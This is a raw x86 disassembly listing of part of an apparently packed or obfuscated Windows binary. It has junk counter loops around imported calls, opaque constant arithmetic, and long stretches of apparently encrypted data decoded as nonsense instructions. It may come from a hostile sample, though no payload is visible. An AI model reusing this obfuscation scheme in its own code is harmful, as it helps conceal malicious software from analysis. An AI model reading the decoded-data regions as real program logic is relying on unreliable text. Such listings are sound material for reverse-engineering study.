  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x4304a6,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e766,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e766
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e766,ecx
  403899:	cmp    DWORD PTR ds:0x42e766,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e766,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42e9dc
  4038bc:	cmp    DWORD PTR ds:0x42e766,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e766
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e766,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42ee28,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42ee28
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42ee28,edi
  403903:	cmp    DWORD PTR ds:0x42ee28,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42e9f4
  403920:	cmp    DWORD PTR ds:0x42ee28,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42ee28
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42ee28,edi
  40393a:	cmp    DWORD PTR ds:0x42ee28,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ee1c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ee1c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ee1c,ecx
  403963:	cmp    DWORD PTR ds:0x42ee1c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ee1c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42eb9c
  403988:	cmp    DWORD PTR ds:0x42ee1c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ee1c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ee1c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ee14,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x4304a6
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43048e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x4304aa,0x1d
  4039e0:	cmp    DWORD PTR ds:0x4304aa,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x4304aa,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42e9e0
  403a03:	mov    edi,DWORD PTR ds:0x4304aa
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x4304aa,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42ee30,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x4304aa
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x43055a,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x43055a
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x43055a,edx
  403a58:	cmp    DWORD PTR ds:0x43055a,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42e9f8
  403a77:	cmp    DWORD PTR ds:0x43055a,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x430542,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e75a,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x43054a,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43048a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430592
  403aee:	mov    edx,DWORD PTR ds:0x42e9b0
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x4304b2,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ee1c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x4304aa,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x4304aa
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x4304aa,edx
  403b28:	cmp    DWORD PTR ds:0x4304aa,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42eac0
  403b43:	cmp    DWORD PTR ds:0x4304aa,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x4304aa
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x4304aa,edx
  403b5d:	cmp    DWORD PTR ds:0x4304aa,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x430542,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430492,0x430552
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43048e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43048a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x4304c2,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42ee20,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42ee30
  403bc5:	and    ebx,DWORD PTR ds:0x430552
  403bcb:	mov    DWORD PTR ds:0x42ee30,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e75a,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e75a
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e75a,ebx
  403bea:	cmp    DWORD PTR ds:0x42e75a,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42e9fc
  403c05:	cmp    DWORD PTR ds:0x42e75a,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x4304c2,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43048e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43048e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43048e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42ea00
  403c4d:	cmp    DWORD PTR ds:0x43048e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43048e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43048e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43048e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43048e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x43054e,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x43054a,0x4304c2
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430486
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x43054a
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42ee24,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43048a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x4304ae,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e776
  403ce8:	adc    DWORD PTR ds:0x42ee10,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x4304aa
  403cfb:	sbb    DWORD PTR ds:0x42e76e,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax+0x35aa326d],0x47
  403d2b:	mov    edx,0x7e7e11b6
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403d4f
  403d35:	dec    eax
  403d36:	fs pop ds
  403d38:	imul   esp,DWORD PTR [eax+eiz*2+0x51],0x29
  403d3d:	jae    0x403d6c
  403d3f:	mov    ch,0x91
  403d41:	mov    WORD PTR [edi+esi*2+0x3583bcfe],ds
  403d48:	leave  
  403d49:	ja     0x403cd4
  403d4b:	mov    esi,0x90dbe37f
  403d50:	popf   
  403d51:	shr    DWORD PTR [edi],cl
  403d53:	sar    DWORD PTR [ebp-0x63034c7f],0x21
  403d5a:	sub    DWORD PTR [ecx+0x2f],ebx
  403d5d:	or     eax,0xbb160bc1
  403d62:	ret    
  403d63:	dec    esp
  403d64:	jo     0x403cf6
  403d66:	pop    eax
  403d67:	fwait
  403d68:	ror    dl,0x41
  403d6b:	shl    BYTE PTR [edi+0x4ab53070],cl
  403d71:	pop    es
  403d72:	clc    
  403d73:	sub    eax,DWORD PTR [edi-0x47e4a475]
  403d79:	(bad)  
  403d7a:	mov    dh,0xa9
  403d7c:	xsave  ds:0x87cffd4a
  403d83:	sbb    ecx,DWORD PTR [eax+0x10558920]
  403d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d8a:	sbb    DWORD PTR [eax-0x36],0x4a00d951
  403d91:	jl     0x403dfe
  403d93:	in     eax,dx
  403d94:	or     BYTE PTR ds:0x9a06bf95,dl
  403d9a:	inc    esi
  403d9b:	into   
  403d9c:	icebp  
  403d9d:	pop    esi
  403d9e:	pop    edi
  403d9f:	adc    DWORD PTR [eax],edx
  403da1:	sbb    edi,DWORD PTR ds:0xcb006c8f
  403da7:	cli    
  403da8:	sub    al,0xa2
  403daa:	pusha  
  403dab:	outs   dx,BYTE PTR ds:[esi]
  403dac:	(bad)  
  403dad:	lock or DWORD PTR [esi-0x4c],esi
  403db1:	push   0xffffffd7
  403db3:	jecxz  0x403dd5
  403db5:	(bad)  
  403db6:	into   
  403db7:	mov    dh,0x56
  403db9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dba:	fld    TBYTE PTR [ebx]
  403dbc:	add    al,0x9d
  403dbe:	movq   QWORD PTR [ebp-0x678b7ab2],mm1
  403dc5:	inc    ebp
  403dc6:	fisub  WORD PTR [ebx+0x2f2c0900]
  403dcc:	inc    esp
  403dcd:	test   al,0x41
  403dcf:	sub    eax,0xaee0f8b2
  403dd4:	enter  0x770f,0x3e
  403dd8:	and    BYTE PTR [esi],0xd
  403ddb:	popa   
  403ddc:	push   ebx
  403ddd:	je     0x403d6d
  403ddf:	pushf  
  403de0:	add    al,BYTE PTR [ebx+edi*4]
  403de3:	jl     0x403e1b
  403de5:	cdq    
  403de6:	scas   al,BYTE PTR es:[edi]
  403de7:	pop    ebx
  403de8:	or     edx,DWORD PTR [eax]
  403dea:	pushf  
  403deb:	dec    ebp
  403dec:	fdivr  QWORD PTR [esi-0x3b2dffba]
  403df2:	jmp    FWORD PTR [ebx+esi*1]
  403df5:	jle    0x403e27
  403df7:	aas    
  403df8:	or     DWORD PTR [edx],edi
  403dfa:	jle    0x403e4e
  403dfc:	out    dx,eax
  403dfd:	jnp    0x403e15
  403dff:	xchg   edx,eax
  403e00:	jmp    0x403def
  403e02:	xchg   edi,eax
  403e03:	cld    
  403e04:	imul   edx,DWORD PTR ss:[eax+0x52bdd6f8],0x2b0156fe
  403e0f:	and    esi,ebx
  403e11:	out    0x52,eax
  403e13:	fidivr WORD PTR [edi*8+0x663b54ef]
  403e1a:	shl    DWORD PTR [ecx+0x39ad7ebe],cl
  403e20:	xchg   esp,eax
  403e21:	push   cs
  403e22:	rep outs dx,BYTE PTR ds:[esi]
  403e24:	in     al,dx
  403e25:	aas    
  403e26:	inc    ebp
  403e27:	jge    0x403e74
  403e29:	dec    ebx
  403e2a:	sti    
  403e2b:	(bad)
  403e2e:	mov    bh,BYTE PTR [esi]
  403e30:	jmp    0x2033:0x93728d0
  403e37:	jb     0x403e87
  403e39:	mov    ds:0xf6706cb1,eax
  403e3e:	std    
  403e3f:	leave  
  403e40:	adc    ecx,esp
  403e42:	test   ecx,ecx
  403e44:	mov    esi,0x9a19d95
  403e49:	mov    cl,0xb5
  403e4b:	dec    ecx
  403e4c:	dec    ebp
  403e4d:	loope  0x403deb
  403e4f:	or     DWORD PTR [ebx+ecx*4+0x11],esp
  403e53:	xchg   DWORD PTR [ecx+0x44f9378d],esp
  403e59:	inc    ecx
  403e5a:	pop    edi
  403e5b:	pop    edi
  403e5c:	mov    al,0xae
  403e5e:	(bad)  
  403e5f:	nop
  403e60:	clc    
  403e61:	mov    BYTE PTR [ebx+ecx*8],0x40
  403e65:	inc    esi
  403e66:	retf   0x7584
  403e69:	adc    edx,DWORD PTR [eax]
  403e6b:	push   es
  403e6c:	push   0xffffffc7
  403e6e:	ret    0x1c85
  403e71:	lods   al,BYTE PTR ds:[esi]
  403e72:	sahf   
  403e73:	lods   eax,DWORD PTR ds:[esi]
  403e74:	pop    esi
  403e75:	xor    esp,DWORD PTR [edi-0xd9705d]
  403e7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e7c:	cmp    BYTE PTR [esi+0x283f7b04],cl
  403e82:	or     esp,DWORD PTR [edx]
  403e84:	(bad)  
  403e86:	ss icebp 
  403e88:	add    BYTE PTR [esi-0x26feb7bb],dh
  403e8e:	out    0xb3,al
  403e90:	out    0x2f,eax
  403e92:	and    eax,0x768c0f5
  403e97:	sub    al,0x53
  403e99:	jns    0x403e7a
  403e9b:	inc    esi
  403e9c:	shl    bh,cl
  403e9e:	inc    edx
  403e9f:	xchg   ecx,eax
  403ea0:	enter  0xf55,0x63
  403ea4:	scas   eax,DWORD PTR es:[edi]
  403ea5:	push   cs
  403ea6:	retf   0x2cd0
  403ea9:	push   ebx
  403eaa:	int    0x54
  403eac:	add    edi,DWORD PTR [edi-0x9]
  403eaf:	(bad)  
  403eb0:	cmp    al,0xba
  403eb2:	je     0x403ee3
  403eb4:	hlt    
  403eb5:	push   ebp
  403eb6:	daa    
  403eb7:	jns    0x403f36
  403eb9:	add    dh,BYTE PTR [ecx+0x365011aa]
  403ebf:	jg     0x403ed1
  403ec1:	mov    edx,DWORD PTR [ebp-0x28]
  403ec4:	jmp    0x404613
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0x197278c4,al
  403efc:	inc    esp
  403efd:	js     0x403e9c
  403eff:	ret    
  403f00:	adc    edi,DWORD PTR [esi+0x7e]
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403ee2
  403f08:	adc    al,0xea
  403f0a:	imul   ebp,edi,0x2e
  403f0d:	icebp  
  403f0e:	loopne 0x403ef1
  403f10:	xchg   BYTE PTR [ebx-0x52],al
  403f13:	mov    ebp,0xf6d291cf
  403f18:	inc    ebp
  403f19:	add    BYTE PTR [esi+0x4c1c3a0d],ch
  403f1f:	and    eax,0xcec6dd1f
  403f24:	add    ebp,0xb11d788
  403f2a:	jle    0x403ef2
  403f2c:	fnstsw WORD PTR [ebp+0x428169da]
  403f32:	jo     0x403f58
  403f34:	cmp    eax,DWORD PTR [esi]
  403f36:	sbb    DWORD PTR [eax-0x19e58c86],eax
  403f3c:	stc    
  403f3d:	adc    DWORD PTR [esi],edi
  403f3f:	jno    0x403f4c
  403f41:	add    DWORD PTR [edx+0x38233f36],esp
  403f47:	push   0xffffffb1
  403f49:	push   edi
  403f4a:	(bad)  
  403f4b:	gs out dx,eax
  403f4d:	sub    BYTE PTR [ecx],ah
  403f4f:	push   ss
  403f50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f51:	stc    
  403f52:	xchg   edx,eax
  403f53:	sub    al,0xf0
  403f55:	push   ss
  403f56:	ins    BYTE PTR es:[edi],dx
  403f57:	mov    al,BYTE PTR [ebp-0x54404fd]
  403f5d:	in     al,0x1e
  403f5f:	mov    bl,0x6f
  403f61:	ins    DWORD PTR es:[edi],dx
  403f62:	popa   
  403f63:	pop    ebp
  403f64:	ins    BYTE PTR es:[edi],dx
  403f65:	jns    0x403f7c
  403f67:	mov    bl,0x22
  403f69:	or     al,0x4
  403f6b:	addr16 pusha 
  403f6d:	clc    
  403f6e:	sbb    esi,edx
  403f70:	xor    eax,0x932a16c3
  403f75:	test   BYTE PTR [ebp-0x24a3a619],ch
  403f7b:	mov    edi,0xbf099587
  403f80:	retf   0x3322
  403f83:	mov    dl,0xe
  403f85:	sub    edx,DWORD PTR [edx+0x5829129d]
  403f8b:	jmp    0x23286fd4
  403f90:	push   0xffffffaa
  403f92:	sub    ch,BYTE PTR [eax+0x37]
  403f95:	or     eax,0x2cc6347f
  403f9a:	push   0x7046bcc7
  403f9f:	adc    dh,BYTE PTR [edi-0x1]
  403fa2:	ja     0x403f7b
  403fa4:	xchg   ebp,eax
  403fa5:	les    edx,FWORD PTR [ecx-0x2655bfd0]
  403fab:	or     DWORD PTR [ecx+0xb9e546c],ebx
  403fb1:	push   eax
  403fb2:	fsub   QWORD PTR [eax]
  403fb4:	and    eax,0xd2e5a774
  403fb9:	inc    ecx
  403fba:	les    ebx,FWORD PTR [ecx+0x25ce2448]
  403fc0:	xor    ah,0xcc
  403fc3:	int3   
  403fc4:	cmp    BYTE PTR [esi+0x59596cd1],ch
  403fca:	mov    DWORD PTR [edx+0x2],ebx
  403fcd:	and    al,0x60
  403fcf:	retf   
  403fd0:	xor    al,bl
  403fd2:	or     DWORD PTR [edi-0x19],0x9193d765
  403fd9:	xor    eax,0xdf076feb
  403fde:	jnp    0x40405d
  403fe0:	dec    eax
  403fe1:	xchg   DWORD PTR [edi],esp
  403fe3:	add    eax,0x872947d2
  403fe8:	rcl    DWORD PTR [edi],1
  403fea:	cli    
  403feb:	jge    0x40404b
  403fed:	jp     0x403ff0
  403fef:	in     al,0xb
  403ff1:	retf   0xbdb0
  403ff4:	or     eax,0x9d5a4416
  403ff9:	ficomp DWORD PTR [esi+0x6a]
  403ffc:	sub    ah,BYTE PTR [eax+0x7216c5bb]
  404002:	xchg   edx,eax
  404003:	nop
  404004:	push   0x1246aeb0
  404009:	bound  ebp,QWORD PTR [ecx+edx*1]
  40400c:	(bad)  
  40400d:	(bad)  
  40400e:	cmp    DWORD PTR [esi+0x23],esi
  404011:	jle    0x404009
  404013:	cmp    eax,0x463562a4
  404018:	mov    ds:0xb628578b,al
  40401d:	jg     0x403fcc
  40401f:	jecxz  0x403fd6
  404021:	mov    dl,0xb2
  404023:	mov    ebx,0xf238d265
  404028:	mov    dh,0x3f
  40402a:	inc    esi
  40402b:	xor    eax,0x5ced1f03
  404030:	push   0x78
  404032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404033:	mov    al,0x2b
  404035:	or     cl,0xdd
  404038:	ds out 0x10,al
  40403b:	dec    esi
  40403c:	sar    DWORD PTR [eax+esi*1+0x5955737c],1
  404043:	add    eax,0x3ad076df
  404048:	inc    esp
  404049:	jmp    0x8b03:0xd3505fa8
  404050:	sub    al,0xac
  404052:	add    bl,BYTE PTR [ebp-0x574ab815]
  404058:	and    al,0x1f
  40405a:	loope  0x404042
  40405c:	sbb    eax,0xf109c7e
  404061:	push   eax
  404062:	mov    bl,BYTE PTR ds:0x669ee81
  404068:	jp     0x4040e8
  40406a:	xchg   esi,eax
  40406b:	mov    ds:0x7feabf20,eax
  404070:	mov    edx,0x175265f4
  404075:	xor    al,BYTE PTR [eax]
  404077:	mov    bh,0x79
  404079:	ins    DWORD PTR es:[edi],dx
  40407a:	jle    0x404034
  40407c:	add    ch,BYTE PTR [ebp-0x16273b8d]
  404082:	dec    eax
  404083:	adc    DWORD PTR [edx],ecx
  404085:	aad    0xfb
  404087:	or     BYTE PTR [edx+0x7f],bl
  40408a:	imul   esi,DWORD PTR [esi+edi*4-0x3b3cedab],0x55
  404092:	mov    sp,0x558b
  404096:	aam    0xe9
  404098:	ja     0x40409f
  40409a:	add    BYTE PTR [eax],al
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax-0xc7287b3]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x40404f
  4040c0:	mov    edx,0xc6637501
  4040c5:	icebp  
  4040c6:	pushf  
  4040c7:	adc    eax,0x5a396fc4
  4040cc:	push   ebx
  4040cd:	lock retf 
  4040cf:	popa   
  4040d0:	pop    ebp
  4040d1:	xchg   esp,eax
  4040d2:	mov    edx,0x5f5c6cd2
  4040d7:	sub    ebx,DWORD PTR [ebx+0x10]
  4040da:	pop    eax
  4040db:	and    eax,0xf578cb10
  4040e0:	aas    
  4040e1:	cld    
  4040e2:	adc    eax,0x1155d84b
  4040e7:	inc    ecx
  4040e8:	inc    esi
  4040e9:	pop    ecx
  4040ea:	dec    ecx
  4040eb:	sub    al,0xf9
  4040ed:	pop    ecx
  4040ee:	lods   eax,DWORD PTR ds:[esi]
  4040ef:	jmp    0x40416e
  4040f1:	push   0x424e6510
  4040f6:	pop    esp
  4040f7:	stos   DWORD PTR es:[edi],eax
  4040f8:	or     ecx,0x4c034b24
  4040fe:	mov    cl,0xd5
  404100:	mov    BYTE PTR [esi],al
  404102:	shr    edi,cl
  404104:	rol    esi,cl
  404106:	ret    
  404107:	ins    DWORD PTR es:[edi],dx
  404108:	pop    edi
  404109:	sbb    al,0x92
  40410b:	inc    esp
  40410c:	lds    eax,FWORD PTR [ebx-0x559007b5]
  404112:	push   esi
  404113:	test   eax,0x13d1dcbd
  404118:	ftst   
  40411a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40411b:	les    edx,FWORD PTR [ebp+0x64]
  40411e:	push   cs
  40411f:	jno    0x40411f
  404121:	fcomi  st,st(7)
  404123:	fmul   DWORD PTR [eax+0x71934af4]
  404129:	ja     0x404155
  40412b:	mov    eax,0x89666a0a
  404130:	fidiv  WORD PTR [ebp-0x539fbb3f]
  404136:	ja     0x404138
  404138:	call   0xdd743db1
  40413d:	inc    eax
  40413e:	cmp    bh,cl
  404140:	in     al,dx
  404141:	inc    ecx
  404142:	nop
  404143:	addr16 mov ebx,0xacc2d2c9
  404149:	mov    ebp,0xf935166c
  40414e:	call   0x1b78:0x341664c7
  404155:	jb     0x404114
  404157:	add    eax,DWORD PTR [ebp+0x1b]
  40415a:	call   0xe943d893
  40415f:	leave  
  404160:	mov    bl,0xb9
  404162:	push   ebp
  404163:	mov    al,ds:0xa4d4aa4a
  404168:	dec    edi
  404169:	in     eax,0x21
  40416b:	cmp    al,0x98
  40416d:	mov    ebx,0x917f6141
  404172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404173:	fwait
  404174:	add    al,0xb5
  404176:	(bad)  
  404177:	(bad)  
  404178:	fnstsw WORD PTR [ebx]
  40417a:	dec    ebx
  40417b:	mov    dh,0xa6
  40417d:	das    
  40417e:	pop    ecx
  40417f:	push   eax
  404180:	mov    ecx,0x9ec0380d
  404185:	shrd   DWORD PTR [edx-0x27],ecx,cl
  404189:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40418a:	test   BYTE PTR [edi],bl
  40418c:	sbb    BYTE PTR [esp+ebp*4],dh
  40418f:	in     eax,dx
  404190:	lahf   
  404191:	jmp    ebx
  404193:	mov    esp,0xbeed587f
  404198:	int3   
  404199:	sbb    BYTE PTR [ebp-0x5c2137d9],dh
  40419f:	in     eax,dx
  4041a0:	inc    ecx
  4041a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041a2:	and    DWORD PTR [edx+0x0],0xffffff9b
  4041a6:	pop    ss
  4041a7:	xchg   esi,eax
  4041a8:	icebp  
  4041a9:	jecxz  0x40420c
  4041ab:	fs xchg edx,eax
  4041ad:	fdiv   DWORD PTR [ebp-0x13]
  4041b0:	add    BYTE PTR [esi+edx*2-0x52],al
  4041b4:	test   eax,0x7c01450c
  4041b9:	adc    esi,DWORD PTR gs:[ebp-0x4fa5ec05]
  4041c0:	cs hlt 
  4041c2:	sbb    DWORD PTR [ecx],ecx
  4041c4:	mov    edx,0x9aea3072
  4041c9:	call   0x6e3d:0xa2038f54
  4041d0:	test   al,0xaa
  4041d2:	xchg   DWORD PTR [edi-0x7cc7093a],edx
  4041d8:	mov    eax,ds:0x98ef68dc
  4041dd:	test   DWORD PTR [ecx],0x8e39cb5d
  4041e3:	sbb    ecx,DWORD PTR [ebx+0x53]
  4041e6:	es call 0x176c:0xd617dc85
  4041ee:	shl    DWORD PTR ds:0xd7f0c16d,0x59
  4041f5:	gs jbe 0x40426c
  4041f8:	mov    eax,0x76cad3a7
